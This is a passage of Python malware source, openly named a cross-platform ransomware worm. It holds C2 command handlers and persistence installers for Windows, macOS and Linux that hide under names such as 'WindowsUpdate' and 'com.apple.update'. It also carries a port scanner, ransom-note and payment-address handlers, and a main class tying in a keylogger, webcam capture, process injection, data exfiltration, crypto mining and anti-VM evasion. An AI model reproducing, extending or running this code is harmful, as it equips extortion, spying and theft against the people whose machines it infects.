    def handle_directory_list(self, params):
        path = params.get('path', '.')
        if not os.path.exists(path):
            return {'error': 'Path not found'}
        contents = []
        try:
            for item in os.listdir(path)[:20]:
                full_path = os.path.join(path, item)
                contents.append({
                    'name': item,
                    'is_dir': os.path.isdir(full_path),
                    'size': os.path.getsize(full_path) if not os.path.isdir(full_path) else 0
                })
        except:
            pass
        return {'path': path, 'contents': contents}
    
    def handle_install_persistence(self, params):
        installed = []
        
        if self.os_type == 'windows':
            installed.extend(self._install_windows_persistence())
        elif self.os_type == 'darwin':
            installed.extend(self._install_macos_persistence())
        else:
            installed.extend(self._install_linux_persistence())
        
        return {'installed': installed}
    
    def _install_windows_persistence(self):
        installed = []
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg:
                winreg.SetValueEx(reg, 'SystemService', 0, winreg.REG_SZ,
                                f'"{sys.executable}" "{os.path.abspath(__file__)}"')
            installed.append('registry')
        except:
            pass
        
        try:
            startup = os.path.join(os.environ.get('APPDATA', ''),
                                 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            if os.path.exists(startup):
                shutil.copy2(os.path.abspath(__file__),
                           os.path.join(startup, 'SystemUpdate.py'))
                installed.append('startup')
        except:
            pass
        
        # Schedule Task
        try:
            subprocess.run(['schtasks', '/create', '/tn', 'WindowsUpdate',
                          '/tr', f'"{sys.executable}" "{os.path.abspath(__file__)}"',
                          '/sc', 'onstart', '/f'], capture_output=True)
            installed.append('scheduled_task')
        except:
            pass
        
        return installed
    
    def _install_macos_persistence(self):
        installed = []
        try:
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            plist_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.update.plist')
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            subprocess.run(['launchctl', 'load', plist_path])
            installed.append('launchd')
        except:
            pass
        
        # Add to .bash_profile
        try:
            with open(os.path.expanduser('~/.bash_profile'), 'a') as f:
                f.write(f'\npython3 "{os.path.abspath(__file__)}" &\n')
            installed.append('bash_profile')
        except:
            pass
        
        return installed
    
    def _install_linux_persistence(self):
        installed = []
        
        # Cron
        try:
            cron_line = f"*/5 * * * * {sys.executable} {os.path.abspath(__file__)} > /dev/null 2>&1"
            subprocess.run(['crontab', '-l'], stdout=open('/tmp/cron', 'w'), stderr=subprocess.DEVNULL)
            with open('/tmp/cron', 'a') as f:
                f.write(cron_line + '\n')
            subprocess.run(['crontab', '/tmp/cron'])
            os.remove('/tmp/cron')
            installed.append('cron')
        except:
            pass
        
        # Systemd
        try:
            service_content = f'''[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always

[Install]
WantedBy=multi-user.target
'''
            service_path = '/etc/systemd/system/system-update.service'
            with open(service_path, 'w') as f:
                f.write(service_content)
            subprocess.run(['systemctl', 'daemon-reload'])
            subprocess.run(['systemctl', 'enable', 'system-update.service'])
            installed.append('systemd')
        except:
            pass
        
        # .bashrc
        try:
            with open(os.path.expanduser('~/.bashrc'), 'a') as f:
                f.write(f'\npython3 "{os.path.abspath(__file__)}" &\n')
            installed.append('bashrc')
        except:
            pass
        
        return installed
    
    def handle_persistence_status(self, params):
        status = {}
        
        if self.os_type == 'windows':
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg:
                    winreg.QueryValueEx(reg, 'SystemService')
                status['registry'] = True
            except:
                status['registry'] = False
        elif self.os_type == 'darwin':
            status['launchd'] = os.path.exists(
                os.path.expanduser('~/Library/LaunchAgents/com.apple.update.plist')
            )
            status['bash_profile'] = os.path.exists(os.path.expanduser('~/.bash_profile'))
        else:
            try:
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                status['cron'] = __file__ in result.stdout
            except:
                status['cron'] = False
            status['systemd'] = os.path.exists('/etc/systemd/system/system-update.service')
            status['bashrc'] = os.path.exists(os.path.expanduser('~/.bashrc'))
        
        return status
    
    def handle_port_scan(self, params):
        target = params.get('target')
        if not target:
            return {'error': 'Target required'}
        ports = params.get('ports', [22, 80, 443, 3389])
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if sock.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return {'target': target, 'open_ports': open_ports}
    
    def handle_display_ransom_note(self, params):
        note = f"""
============================================================
                     SYSTEM RESTORE INSTRUCTIONS
============================================================

Your files have been encrypted.

Encryption ID: {self.ransomware.host_id}
Date: {datetime.now().isoformat()}
Machine: {socket.gethostname()}

Payment Required: {self.ransom_amount} {self.ransom_currency}
Payment Address: {self.payment_address}

Contact: restore@example.com

⚠️ WARNING: Do not attempt to decrypt files yourself!
⚠️ Attempting to decrypt without proper key may result in permanent data loss!
============================================================
"""
        print(note)
        
        # Try to create HTML ransom note
        try:
            html_note = f"""
            <html>
            <body style="background-color: black; color: red; font-family: Arial; text-align: center; padding: 50px;">
            <h1>🔒 YOUR FILES ARE ENCRYPTED</h1>
            <h2>Encryption ID: {self.ransomware.host_id}</h2>
            <p>Date: {datetime.now().isoformat()}</p>
            <h3>Payment Required: {self.ransom_amount} {self.ransom_currency}</h3>
            <h3>Payment Address: {self.payment_address}</h3>
            <p>Contact: restore@example.com</p>
            </body>
            </html>
            """
            with open(os.path.expanduser('~/Desktop/RANSOM_NOTE.html'), 'w') as f:
                f.write(html_note)
        except:
            pass
        
        return {'status': 'ransom_note_displayed'}
    
    def handle_change_ransom_amount(self, params):
        amount = params.get('amount')
        if not amount:
            return {'error': 'Amount required'}
        self.ransom_amount = amount
        return {'status': 'updated', 'amount': amount}
    
    def handle_change_payment_address(self, params):
        address = params.get('address')
        if not address:
            return {'error': 'Address required'}
        self.payment_address = address
        return {'status': 'updated', 'address': address}
    
    def handle_deadline(self, params):
        days = params.get('days', 7)
        deadline = (datetime.now() + timedelta(days=days)).isoformat()
        return {'status': 'updated', 'deadline': deadline}
    
    def handle_get_os_info(self, params):
        return {
            'os': self.os_type,
            'version': OSDetector.get_os_version(),
            'architecture': OSDetector.get_architecture(),
            'hostname': socket.gethostname()
        }
    
    def handle_get_stats(self, params):
        stats = self.db.get_stats()
        encryption_stats = self.ransomware.get_encryption_stats()
        return {
            'stats': stats,
            'encryption_stats': encryption_stats,
            'keylogger_active': self.keylogger.is_active,
            'webcam_available': self.webcam.capture is not None,
            'files_encrypted': self.ransomware.files_encrypted,
            'mining_active': self.miner.mining,
            'timestamp': datetime.now().isoformat()
        }

# ============================================================
# REDUNDANT C2 COMMUNICATION
# ============================================================

class RedundantC2(SecureC2):
    """Enhanced C2 with encryption and redundancy"""
    
    def __init__(self, db=None):
        debug_log("Initializing Enhanced C2")
        super().__init__(db)
        self.c2_domain = C2_SERVER
        self.active_channel = None
        self.last_heartbeat = None
    
    def send_beacon(self, data):
        """Enhanced beacon with encryption support"""
        if self.public_key:
            return self.send_encrypted(data)
        return super().send_beacon(data)

# ============================================================
# MAIN WORM CLASS
# ============================================================

class CrossPlatformWorm:
    """Complete cross-platform ransomware worm with all enhancements"""
    
    def __init__(self):
        debug_log("="*60)
        debug_log("🚀 Starting Cross-Platform Ransomware Worm v5.0 (Enhanced)")
        debug_log("="*60)
        
        # Single instance check
        self.lock = SingleInstance.acquire_lock()
        
        # Anti-VM check
        if AntiVMDetector.check_environment():
            debug_log("⚠️ VM detected, adding delay...")
            AntiVMDetector.stealth_delay()
            # Continue but with stealth mode
        
        # OS detection
        self.os_type = OSDetector.get_os()
        self.os_version = OSDetector.get_os_version()
        self.architecture = OSDetector.get_architecture()
        
        debug_log(f"Detected OS: {self.os_type} ({self.os_version})")
        debug_log(f"Architecture: {self.architecture}")
        
        # Initialize components
        self.db = StealthDatabase()
        self.c2 = RedundantC2(self.db)
        self.keylogger = CrossPlatformKeylogger(self.db)
        self.webcam = CrossPlatformWebcam(self.db)
        self.ransomware = RansomwareEngine(self.db)
        self.command_handler = C2CommandHandler(self)
        self.injector = ProcessInjector()
        self.exfiltrator = DataExfiltrator(self.db, self.c2)
        self.miner = CryptoMiner()
        self.dead_man_switch = DeadManSwitch(self)
        
        # Install persistence
        self._install_persistence()
        
        debug_log("✅ Worm initialized successfully")
        debug_log("="*60)
    
    def _install_persistence(self):
        """Install persistence"""
        debug_log("Installing persistence...")
        self.command_handler.handle_install_persistence({})
    
    def run(self):
        """Main execution loop"""
        print("\n" + "="*60)
        print("🕵️ CROSS-PLATFORM RANSOMWARE WORM v5.0 (Enhanced)")
        print("="*60)
        print(f"📁 Host ID: {self.ransomware.host_id}")
        print(f"🖥️  OS: {self.os_type} ({self.os_version})")
        print(f"📐 Architecture: {self.architecture}")
        print(f"📡 C2 Server: {C2_SERVER}")
        print("="*60)
        
        # Send initial beacon
        self.c2.send_beacon({
            'type': 'registration',
            'host_id': self.ransomware.host_id,
            'hostname': socket.gethostname(),
            'os': self.os_type,
            'os_version': self.os_version,
            'architecture': self.architecture,
            'timestamp': datetime.now().isoformat()
        })
        
        # Start command processing thread
        threading.Thread(target=self._process_commands, daemon=True).start()
        debug_log("Command processing thread started")
        
        # Start dead man's switch monitor
        threading.Thread(target=self._monitor_dead_man_switch, daemon=True).start()
        debug_log("Dead man's switch monitor started")
        
        # Main loop
        try:
            while True:
                # Send heartbeat
                self.c2.send_beacon({
                    'type': 'heartbeat',
                    'host_id': self.ransomware.host_id,
                    'timestamp': datetime.now().isoformat()
                })
                self.dead_man_switch.update_heartbeat()
                
                # Random sleep
                sleep_time = secrets.randbelow(3600) + 1800
                time.sleep(sleep_time)
                
        except KeyboardInterrupt:
            debug_log("🛑 Stopped by user")
            print("\n🛑 Stopped by user")
        except Exception as e:
            debug_log(f"❌ Error in main loop: {e}", "ERROR")
            print(f"❌ Error: {e}")
            time.sleep(60)
    
    def _process_commands(self):
        """Process incoming commands"""
        while True:
            try:
                command = self.c2.receive_commands()
                if command:
                    self.command_handler.handle_command(command)
                    self.dead_man_switch.update_heartbeat()
                time.sleep(30)
            except Exception as e:
                debug_log(f"Command processing error: {e}", "ERROR")
                time.sleep(60)
    
    def _monitor_dead_man_switch(self):
        """Monitor dead man's switch"""
        while True:
            try:
                if self.dead_man_switch.check_heartbeat():
                    debug_log("Dead man's switch triggered")
                time.sleep(3600)  # Check every hour
            except Exception as e:
                debug_log(f"Dead man's switch monitor error: {e}", "ERROR")
                time.sleep(3600)

# ============================================================
# MAIN ENTRY POINT
# ============================================================

def main():
    """Main entry point with debugging"""
    debug_log("="*60)
    debug_log("WORM EXECUTION STARTED")
    debug_log("="*60)
    
    # Handle command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "--setup":
            debug_log("Setup mode")
            print("🔐 SETUP COMPLETE!")
            sys.exit(0)
        
        elif sys.argv[1] == "--debug":
            debug_log("Debug mode enabled")
            print("🐛 DEBUG MODE ENABLED")
            print(f"📝 Log file: {LOG_FILE}")
            
            # Print system info
            print(f"OS: {platform.system()}")
            print(f"OS Version: {platform.platform()}")
            print(f"Architecture: {platform.machine()}")
            print(f"Python: {sys.version}")
            
            # Test components
            print("\n🧪 Testing components...")
            
            # Test keylogger
            print("\n🔑 Testing keylogger...")
            keylogger = CrossPlatformKeylogger()
            if keylogger.start():
                print("✅ Keylogger started")
                time.sleep(2)
                keylogger.stop()
                print(f"✅ Keylogger stopped. Logged {len(keylogger.log_data)} keys")
            else:
                print("❌ Keylogger test failed")
            
            # Test webcam
            print("\n📷 Testing webcam...")
            webcam = CrossPlatformWebcam()
            if webcam.capture:
                print("✅ Webcam initialized")
                frame = webcam.capture_frame()
                if frame:
                    print(f"✅ Frame captured: {len(frame)} bytes")
                webcam.release()
            else:
                print("❌ Webcam test failed")
            
            # Test anti-VM
            print("\n🛡️ Testing anti-VM detection...")
            is_vm = AntiVMDetector.check_environment()
            print(f"VM detected: {is_vm}")
            
            sys.exit(0)
        
        elif sys.argv[1] == "--clean":
            debug_log("Clean mode")
            if os.path.exists(CONFIG_DIR):
                shutil.rmtree(CONFIG_DIR)
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
            if os.path.exists(CHECKPOINT_FILE):
                os.remove(CHECKPOINT_FILE)
            if os.path.exists(LOCK_FILE):
                os.remove(LOCK_FILE)
            print("🧹 Cleaned up")
            sys.exit(0)
    
    # Run worm
    try:
        worm = CrossPlatformWorm()
        worm.run()
    except Exception as e:
        debug_log(f"Fatal error: {e}", "ERROR")
        print(f"❌ Fatal error: {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()
